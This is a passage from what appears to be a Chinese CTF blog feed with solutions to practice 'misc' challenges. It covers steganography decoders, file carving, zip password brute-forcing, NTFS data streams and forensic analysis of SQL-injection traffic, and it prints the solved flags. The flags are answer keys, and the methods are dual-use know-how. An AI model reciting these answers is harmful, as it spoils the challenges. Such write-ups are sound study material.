class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;132&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;112&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;137&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;112&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = decode(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="https://pic1.imgdb.cn/item/67bc64c2d0e0a243d403a03d.png" alt=""></p><h4 id="题目04：小易的U盘"><a href="#题目04：小易的U盘" class="headerlink" title="题目04：小易的U盘"></a>题目04：小易的U盘</h4><p>iso镜像,直接使用foremost文件提取，可以发现里面有一大堆文件：</p><p><img src="https://pic1.imgdb.cn/item/67bc698fd0e0a243d403a75e.png" alt=""></p><p>这时候我们点击autorun.inf,出现提示信息，指向第32个副本：</p><p><img src="https://pic1.imgdb.cn/item/67bc69cdd0e0a243d403a79d.png" alt=""></p><p>将其放入随波逐流，得到flag：</p><p><img src="https://pic1.imgdb.cn/item/67bc69ffd0e0a243d403a7e5.png" alt=""></p><h4 id="题目05：-WUSTCTF2020-爬"><a href="#题目05：-WUSTCTF2020-爬" class="headerlink" title="题目05：[WUSTCTF2020]爬"></a>题目05：[WUSTCTF2020]爬</h4><p>文件类型未知，通过随波逐流查看，发现文件类型为pdf。</p><p><img src="https://pic1.imgdb.cn/item/67bda69ad0e0a243d405530d.png" alt=""></p><p>修改后缀名：</p><p>提示flag被图片覆盖住了：</p><p><img src="https://pic1.imgdb.cn/item/67bda6edd0e0a243d405544c.png" alt=""></p><p>我们需要移开图片，将pdf放入word打开，删除图片，我们发现下面有一行数据：</p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250225191928545.png" alt="image-20250225191928545"></p><p>0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</p><p>很显然是十六进制（0x）,进行进制转换后得到flag：</p><p><img src="https://pic1.imgdb.cn/item/67bda7cdd0e0a243d4055729.png" alt=""></p><h4 id="题目06：-RoarCTF2019-黄金6年"><a href="#题目06：-RoarCTF2019-黄金6年" class="headerlink" title="题目06：[RoarCTF2019]黄金6年"></a>题目06：[RoarCTF2019]黄金6年</h4><p>题目是一个视频，对其分帧查看，发现隐藏的二维码：</p><p>第一个：</p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250225195509620.png" alt="image-20250225195509620"></p><p><img src="https://pic1.imgdb.cn/item/67bdaffad0e0a243d4055b6e.png" style="zoom:50%;" /></p><p>拿到key1</p><p>第二个：</p><p><img src="https://pic1.imgdb.cn/item/67bdaf72d0e0a243d4055a81.png" alt=""></p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250225195913207.png" alt="image-20250225195913207" style="zoom:33%;" /></p><p>第三个：</p><p><img src="https://cdn.jsdelivr.net/gh/MY-Nlny/picbed/img/202502251932964.png" style="zoom:33%;" /></p><p>使用PS修复后进行扫描，得到key:</p><p><img src="https://cdn.jsdelivr.net/gh/MY-Nlny/picbed/img/202502251935908.png" style="zoom:50%;" /></p><p>第四个：</p><p><img src="https://pic1.imgdb.cn/item/67bdb0bcd0e0a243d4055df6.png" alt=""></p><p>将四个key合并在一起：iwantplayctf</p><p>那么这个key是用来干什么的呢？我们用010打开视频文件</p><p>在其底部发现一串base64编码：</p><p><img src="https://pic1.imgdb.cn/item/67bdb154d0e0a243d4055fe6.png" alt=""></p><p>进行解码，其中有一个rar压缩包，那么iwantplayctf应当就是密码了！</p><p>解压得到flag！</p><h4 id="题目07：alison-likes-jojo"><a href="#题目07：alison-likes-jojo" class="headerlink" title="题目07：alison_likes_jojo"></a>题目07：alison_likes_jojo</h4><p>两张图片，先用随波逐流扫描一下，第一章图片里面有个zip,提取出来：</p><p><img src="https://pic1.imgdb.cn/item/67bdb366d0e0a243d40569ca.png" alt=""></p><p>发现需要密码，这里并不是未加密，由于没有其他信息，尝试暴力破解，成功得到密码888866：</p><p><img src="https://pic1.imgdb.cn/item/67bdb4aad0e0a243d4057065.png" alt=""></p><p>里面是base64,</p><p><img src="https://pic1.imgdb.cn/item/67bdb4f1d0e0a243d4057191.png" alt=""></p><p>进行多次base64解码后，拿到明文；</p><p><img src="https://pic1.imgdb.cn/item/67bdb57ad0e0a243d4057330.png" alt=""></p><p>接下里看第二张图片，此为outguess隐写<del>（别问怎么知道的，因为做不出来看了WP）</del></p><p><img src="https://pic1.imgdb.cn/item/67bef788d0e0a243d4061504.png" alt=""></p><p>成功拿到flag!</p><h3 id="学习总结："><a href="#学习总结：" class="headerlink" title="学习总结："></a>学习总结：</h3><h4 id="base64隐写："><a href="#base64隐写：" class="headerlink" title="base64隐写："></a>base64隐写：</h4><p>正常情况下，解Base64得到的文本再次Base64编码，得到的值应该是和原Base64编码一样的。如果不一样，则证明这段Base64编码文本被隐写了。<br>一般在做CTF题目时遇到大量Base64编码的文本时，就要考虑Base64隐写。<br>题目文件中每一行为一串Base64编码后的字符串，解题思路大致如下：<br>依次读取每行，从中提取出隐写位。</p><pre><code>如果最后没有‘=’，说明没有隐写位，跳过。如果最后是一个‘=’，说明有两位隐写位，将倒数第二个字符转化为对应的二进制索引，然后取后两位。如果最后是两个‘=’，说明有四位隐写位，将倒数第三个字符转化为对应的二进制索引，然后取后四位。将每行提取出的隐写位依次连接起来，每8位为一组转换为ASCII字符，最后不足8位的丢弃</code></pre><p>base64隐写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#base64隐写</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Base64Stego_Decrypt</span>(<span class="params">LineList</span>):</span><br><span class="line">    Base64Char = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     <span class="comment">#Base64字符集 已按照规范排列</span></span><br><span class="line">    BinaryText = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> LineList:</span><br><span class="line">        <span class="keyword">if</span> line.find(<span class="string">&quot;==&quot;</span>) &gt; <span class="number">0</span>:     <span class="comment">#如果文本中有2个=符号</span></span><br><span class="line">            temp = <span class="built_in">bin</span>(Base64Char.find(line[-<span class="number">3</span>]) &amp; <span class="number">15</span>)[<span class="number">2</span>:]      <span class="comment">#通过按位与&amp;15运算取出二进制数后4位 [2:]的作用是将0b过滤掉</span></span><br><span class="line">            BinaryText = BinaryText + <span class="string">&quot;0&quot;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(temp)) + temp      <span class="comment">#高位补0</span></span><br><span class="line">            <span class="built_in">print</span>(BinaryText)</span><br><span class="line">        <span class="keyword">elif</span> line.find(<span class="string">&quot;=&quot;</span>) &gt; <span class="number">0</span>:        <span class="comment">#如果文本中有1个=符号</span></span><br><span class="line">            temp = <span class="built_in">bin</span>(Base64Char.find(line[-<span class="number">2</span>]) &amp; <span class="number">3</span>)[<span class="number">2</span>:]       <span class="comment">#通过按位与&amp;3运算取出二进制数后2位</span></span><br><span class="line">            BinaryText = BinaryText + <span class="string">&quot;0&quot;</span> * (<span class="number">2</span> - <span class="built_in">len</span>(temp)) + temp      <span class="comment">#高位补0</span></span><br><span class="line">    Text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(BinaryText) % <span class="number">8</span> != <span class="number">0</span>):       <span class="comment">#最终得到的隐写数据二进制位数不一定都是8的倍数，为了避免数组越界，加上一个判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;警告:二进制文本位数有误，将进行不完整解析。&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(BinaryText), <span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">8</span> &gt; <span class="built_in">len</span>(BinaryText)):</span><br><span class="line">                Text = Text + <span class="string">&quot;-&quot;</span> + BinaryText[i:]</span><br><span class="line">                <span class="keyword">return</span> Text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Text = Text + <span class="built_in">chr</span>(<span class="built_in">int</span>(BinaryText[i : i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(BinaryText), <span class="number">8</span>):</span><br><span class="line">            Text = Text + <span class="built_in">chr</span>(<span class="built_in">int</span>(BinaryText[i : i + <span class="number">8</span>], <span class="number">2</span>))      <span class="comment">#将得到的二进制数每8位一组对照ASCII码转化字符</span></span><br><span class="line">        <span class="keyword">return</span> Text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Base64_ForString_Decrypt</span>(<span class="params">Text</span>):     <span class="comment">#Base64解密</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        DecryptedText = <span class="built_in">str</span>(Text).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        DecryptedText = base64.b64decode(DecryptedText)</span><br><span class="line">        DecryptedText = DecryptedText.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> DecryptedText</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Course = <span class="built_in">input</span>(<span class="string">&quot;文件名:&quot;</span>)</span><br><span class="line">    File = <span class="built_in">open</span>(Course, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    LineList = File.read().splitlines()</span><br><span class="line">    <span class="comment">#print(&quot;显式内容为:&quot;)</span></span><br><span class="line">    <span class="comment">#for line in LineList:</span></span><br><span class="line">    <span class="comment">#    print(Base64_ForString_Decrypt(line),end=&quot;&quot;)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;隐写内容为:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(Base64Stego_Decrypt(LineList))</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>解隐写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解码base64隐写编码</span></span><br><span class="line"><span class="comment">#python版本 3.9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2Bin</span>(<span class="params">digit</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bin</span>(digit)[<span class="number">2</span>:]<span class="comment">#将索引转成二进制，去掉&#x27;0b&#x27;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binAsc</span>(<span class="params">string</span>):<span class="comment">#二进制转成ASCII码</span></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(string) / <span class="number">8</span>)):</span><br><span class="line">temp += <span class="built_in">chr</span>(<span class="built_in">int</span>(string[i * <span class="number">8</span> : i* <span class="number">8</span> + <span class="number">8</span>] , <span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readBase64FromFile</span>(<span class="params">filename</span>):</span><br><span class="line">Base64Char = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     <span class="comment">#Base64字符集 已按照规范排列</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename ,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> f.readlines():</span><br><span class="line"><span class="keyword">if</span> data.find(<span class="string">&#x27;==&#x27;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">result += int2Bin(Base64Char.index(data[-<span class="number">4</span>]))[-<span class="number">4</span>:]<span class="comment">#根据隐写原理，‘==’情况取等号前最后一个字符转换后取后4位</span></span><br><span class="line"><span class="keyword">elif</span> data.find(<span class="string">&#x27;=&#x27;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">result += int2Bin(Base64Char.index(data[-<span class="number">3</span>]))[-<span class="number">2</span>:]<span class="comment">#根据隐写原理，‘=’情况取等号前最后一个字符转换后取后2位</span></span><br><span class="line"><span class="built_in">print</span>(binAsc(result))</span><br><span class="line"></span><br><span class="line">readBase64FromFile(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h4><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><ol><li><p>每种整数数据类型（如 <code>int</code>, <code>long</code>, <code>short</code> 等）都有一个最大值和最小值，这个范围是由其位数（bit-width）决定的。例如，一个 32 位的有符号整数（<code>int</code>）通常有一个范围是 -2,147,483,648 到 2,147,483,647。</p></li><li><p>当进行加法、减法、乘法等算术运算时，如果计算结果超出了数据类型所能表示的最大值或最小值，就会发生整数溢出</p></li></ol><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc01（buuctf）</title>
      <link href="/2025/02/19/misc01/"/>
      <url>/2025/02/19/misc01/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF新生赛2020-NTFS数据流"><a href="#ACTF新生赛2020-NTFS数据流" class="headerlink" title="[ACTF新生赛2020]NTFS数据流"></a>[ACTF新生赛2020]NTFS数据流</h2><p>打开题目，压缩包中有很多txt文件：</p><p><img src="https://pic1.imgdb.cn/item/67b5c50fd0e0a243d400cbfb.png" alt=""></p><p>根据题目内容，这道题与NTFS数据流有关。</p><p><a href="https://zhida.zhihu.com/search?content_id=233605059&amp;content_type=Article&amp;match_order=1&amp;q=NTFS交换数据流&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDAxMzg1NzIsInEiOiJOVEZT5Lqk5o2i5pWw5o2u5rWBIiwiemhpZGFfc291cmNlIjoiZW50aXR5IiwiY29udGVudF9pZCI6MjMzNjA1MDU5LCJjb250ZW50X3R5cGUiOiJBcnRpY2xlIiwibWF0Y2hfb3JkZXIiOjEsInpkX3Rva2VuIjpudWxsfQ.cCc3GhCjuAA7R4AYrkmsn9rnRK_cO0drkgFLVTjovYY&amp;zhida_source=entity">NTFS交换数据流</a>（<a href="https://zhida.zhihu.com/search?content_id=233605059&amp;content_type=Article&amp;match_order=1&amp;q=Alternate+DataStreams&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDAxMzg1NzIsInEiOiJBbHRlcm5hdGUgRGF0YVN0cmVhbXMiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMzM2MDUwNTksImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.bUEPkzGqX6i5lQ2K6tsnij65Hb7Ncm4gDeK-4RE_cKk&amp;zhida_source=entity">Alternate DataStreams</a>，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其它文件可以“寄宿”在某个文件身上。</p><p>使用工具NtfsStreamsEditor或AlternateStreamView打开存放tmp文件夹，扫描出现NTFS交换数据流文件，导出后打开，得到flag（或双击查看）。</p><p><img src="https://pic1.imgdb.cn/item/67b5c971d0e0a243d400cd00.png" alt=""></p><p>flag:</p><p><img src="https://pic1.imgdb.cn/item/67b5c945d0e0a243d400cce8.png" alt=""></p><h2 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h2><p>流量包，用wireshark打开：</p><p><img src="https://pic1.imgdb.cn/item/67b5cbefd0e0a243d400cd7e.png" alt=""></p><p>题目为sqltest，那么猜测应该是让我们分析sql注入攻击的流量。</p><p>首先过滤HTTP：<br><img src="https://pic1.imgdb.cn/item/67b5cc8cd0e0a243d400cd8d.png" alt=""></p><p>看出为布尔盲注</p><p>我们将所有HTTP请求导入为csv文件：</p><p>分析文件，可以发现这里是在盲注db_flag库下的tb_flag表里的flag字段内容：</p><p><img src="https://pic1.imgdb.cn/item/67b5ce3cd0e0a243d400cdcc.png" alt=""></p><p>提取出flag的值：</p><p>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</p><p>sql注入的时,使用的是十进制ascii码，转换回字符，得到flag：</p><p><img src="https://pic1.imgdb.cn/item/67b5cfcbd0e0a243d400ce01.png" alt=""></p><p>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p><h2 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h2><p>附件为docx文档：</p><p><img src="https://pic1.imgdb.cn/item/67b5d059d0e0a243d400ce20.png" alt=""></p><p>这是一篇关于“黑客”的介绍，并没有相关提示信息</p><p>文章中也不存在文字的隐写。</p><p>因此，我们从整个文件的角度进行分析。</p><p>将文档放入010 editor，发现文件头是zip的文件头，说明整个文件应该是一个zip压缩包。</p><p><img src="https://pic1.imgdb.cn/item/67b5d193d0e0a243d400ce51.png" alt=""></p><p>于是，将文件后缀名改为zip，进行解压</p><p><img src="https://pic1.imgdb.cn/item/67b5d1dcd0e0a243d400ce56.png" alt=""></p><p>在/word/media/文件夹中，我们找到了flag：</p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250219204449954.png" alt="image-20250219204449954"></p><p>flag{unz1p_3v3ryth1ng}</p><h2 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h2><p>流量分析题，用wireshark打开流量包：</p><p>过滤http：</p><p><img src="https://pic1.imgdb.cn/item/67b5ee78d0e0a243d400d3d6.png" alt=""></p><p>发现有许多图片</p><p>导出http对象：</p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250219224553795.png" alt="image-20250219224553795"></p><p>发现logo.png中是一个旗帜，推测可能与flag有关</p><p>这里参考了WP，使用stegslove打开scanlines.png，在很多通道都发现了一条线：</p><p><img src="https://pic1.imgdb.cn/item/67b5ef39d0e0a243d400d3ef.png" alt=""></p><p>其次，在logo.png中间有一条空缺</p><p>将两张图片使用stegslove进行Image Combiner：</p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250219225407569.png" alt="image-20250219225407569"></p><p>在SUB发现flag</p><h2 id="ACTF新生赛2020-swp"><a href="#ACTF新生赛2020-swp" class="headerlink" title="[ACTF新生赛2020]swp"></a>[ACTF新生赛2020]swp</h2><p>流量分析题，直接wireshark打开流量包：</p><p><img src="https://pic1.imgdb.cn/item/67b5f23cd0e0a243d400d46d.png" alt=""></p><p>过滤http，导出对象</p><p><img src="https://pic1.imgdb.cn/item/67b5f2d2d0e0a243d400d4aa.png" alt=""></p><p>发现有一个可疑的压缩包secret.zip</p><p>进行导出：</p><p>压缩包有密码，用010 editor打开，发现是伪加密：</p><p><img src="https://pic1.imgdb.cn/item/67b5f361d0e0a243d400d4d5.png" alt=""></p><p>进行修复后，直接解压：</p><p>得到的flag直接放入随波逐流，得到flag</p><p><img src="https://pic1.imgdb.cn/item/67b5f3ddd0e0a243d400d4f1.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习笔记</title>
      <link href="/2025/02/17/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/17/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span 